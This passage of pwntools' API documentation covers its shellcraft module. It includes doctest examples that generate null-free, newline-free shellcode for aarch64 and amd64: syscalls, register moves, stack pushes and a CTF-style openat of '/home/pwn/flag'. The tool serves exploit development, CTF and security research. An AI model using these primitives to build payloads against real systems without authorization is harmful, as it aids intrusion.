<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em>, <em>arg6=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">aarch64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(11, 1, &#39;sp&#39;, 2, 0) */</span>
<span class="go">    mov  x0, #1</span>
<span class="go">    mov  x1, sp</span>
<span class="go">    mov  x2, #2</span>
<span class="go">    mov  x3, xzr</span>
<span class="go">    mov  x8, #11</span>
<span class="go">    svc 0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">aarch64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_exit&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call exit(0) */</span>
<span class="go">    mov  x0, xzr</span>
<span class="go">    mov  x8, #SYS_exit</span>
<span class="go">    svc 0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">openat</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* openat(fd=-2, file=&#39;/home/pwn/flag&#39;, oflag=0) */</span>
<span class="go">    /* push &#39;/home/pwn/flag\x00&#39; */</span>
<span class="go">    /* Set x14 = 8606431000579237935 = 0x77702f656d6f682f */</span>
<span class="go">    mov  x14, #26671</span>
<span class="go">    movk x14, #28015, lsl #16</span>
<span class="go">    movk x14, #12133, lsl #0x20</span>
<span class="go">    movk x14, #30576, lsl #0x30</span>
<span class="go">    /* Set x15 = 113668128124782 = 0x67616c662f6e */</span>
<span class="go">    mov  x15, #12142</span>
<span class="go">    movk x15, #27750, lsl #16</span>
<span class="go">    movk x15, #26465, lsl #0x20</span>
<span class="go">    stp x14, x15, [sp, #-16]!</span>
<span class="go">    mov  x1, sp</span>
<span class="go">    /* Set x0 = -2 = -2 */</span>
<span class="go">    mov  x0, #65534</span>
<span class="go">    movk x0, #65535, lsl #16</span>
<span class="go">    movk x0, #65535, lsl #0x20</span>
<span class="go">    movk x0, #65535, lsl #0x30</span>
<span class="go">    mov  x2, xzr</span>
<span class="go">    /* call openat() */</span>
<span class="go">    mov  x8, #SYS_openat</span>
<span class="go">    svc 0</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-shellcraft/amd64"></span><div class="section" id="pwnlib-shellcraft-amd64-shellcode-for-amd64">
<h5><a class="reference internal" href="#module-pwnlib.shellcraft.amd64" title="pwnlib.shellcraft.amd64"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.amd64</span></code></a> &#8212; Shellcode for AMD64<a class="headerlink" href="#pwnlib-shellcraft-amd64-shellcode-for-amd64" title="Permalink to this headline">¶</a></h5>
<div class="section" id="module-pwnlib.shellcraft.amd64">
<span id="pwnlib-shellcraft-amd64"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.amd64" title="pwnlib.shellcraft.amd64"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.amd64</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.amd64" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing generic Intel x86_64 shellcodes.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.amd64.crash">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">crash</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/crash.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.crash" title="Permalink to this definition">¶</a></dt>
<dd><p>Crash.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-11</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.infloop">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">infloop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/infloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.infloop" title="Permalink to this definition">¶</a></dt>
<dd><p>A two-byte infinite loop.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.itoa">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">itoa</code><span class="sig-paren">(</span><em>v</em>, <em>buffer='rsp'</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/itoa.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.itoa" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts an integer into its string representation, and pushes it
onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>v</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer constant or register that contains the value to convert.</li>
<li><strong>alloca</strong> &#8211; </li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">itoa</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">&#39;3735928559\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.memcpy">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">memcpy</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/memcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.memcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies memory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> &#8211; Destination address</li>
<li><strong>src</strong> &#8211; Source address</li>
<li><strong>n</strong> &#8211; Number of bytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.mov">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.mov" title="Permalink to this definition">¶</a></dt>
<dd><p>Move src into dest without newlines and null bytes.</p>
<p>If the src is a register smaller than the dest, then it will be
zero-extended to fit inside the larger register.</p>
<p>If the src is a register larger than the dest, then only some of the bits will
be used.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;amd64&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span><span class="s1">&#39;ebx&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, ebx</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax /* 0 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor ax, ax /* 0 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax /* 0 */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ax&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movzx edi, ax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;al&#39;</span><span class="p">,</span> <span class="s1">&#39;ax&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* moving ax into al, but this is a no-op */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="s1">&#39;bl&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movzx ax, bl</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push 1</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov al, 0xc0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xc000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov ah, 0xc000 &gt;&gt; 8</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xc0c0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov ax, 0xc0c0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rdi&#39;</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov edi, 0x1010101 /* 255 == 0xff */</span>
<span class="go">    xor edi, 0x10101fe</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xdead00ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0x1010101 /* 3735879935 == 0xdead00ff */</span>
<span class="go">    xor eax, 0xdfac01fe</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0x11dead00ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov rax, 0x101010101010101 /* 76750323967 == 0x11dead00ff */</span>
<span class="go">    push rax</span>
<span class="go">    mov rax, 0x1010110dfac01fe</span>
<span class="go">    xor [rsp], rax</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0xffffffff</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0x7fffffff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0x7fffffff</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0x80010101</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0x80010101</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0x1010101 /* 2147483648 == 0x80000000 */</span>
<span class="go">    xor eax, 0x81010101</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push 0xffffffffffffffff</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_read&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax /* SYS_read */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_read&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push SYS_read /* 3 */</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push (PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
<span class="go">    pop rax</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The destination register.</li>
<li><strong>src</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the input register, or an immediate value.</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.nop">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">nop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/nop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.nop" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte nop instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.popad">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">popad</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/popad.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.popad" title="Permalink to this definition">¶</a></dt>
<dd><p>Pop all of the registers onto the stack which i386 popad does,
in the same order.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.push">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">push</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a value onto the stack without using
null bytes or newline characters.</p>
<p>If src is a string, then we try to evaluate with <cite>context.arch = &#8216;amd64&#8217;</cite> using
<code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> before determining how to push it. Note that this
means that this shellcode can change behavior depending on the value of
<cite>context.os</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>value</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The value or register to push</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0 */</span>
<span class="go">    push 1</span>
<span class="go">    dec byte ptr [rsp]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 1 */</span>
<span class="go">    push 1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 256 */</span>
<span class="go">    push 0x1010201 ^ 0x100</span>
<span class="go">    xor dword ptr [rsp], 0x1010201</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_write&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;SYS_write&#39; */</span>
<span class="go">    push 1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_write&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;SYS_write&#39; */</span>
<span class="go">    push 4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.pushad">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">pushad</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/pushad.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.pushad" title="Permalink to this definition">¶</a></dt>
<dd><p>Push all of the registers onto the stack which i386 pushad does,
in the same order.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.pushstr">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack without using
null bytes or newline characters.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\x00&#39; */</span>
<span class="go">    push 1</span>
<span class="go">    dec byte ptr [rsp]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;a\x00&#39; */</span>
<span class="go">    push 0x61</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aa\x00&#39; */</span>
<span class="go">    push 0x1010101 ^ 0x6161</span>
<span class="go">    xor dword ptr [rsp], 0x1010101</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaa\x00&#39; */</span>
<span class="go">    push 0x1010101 ^ 0x616161</span>
<span class="go">    xor dword ptr [rsp], 0x1010101</span>
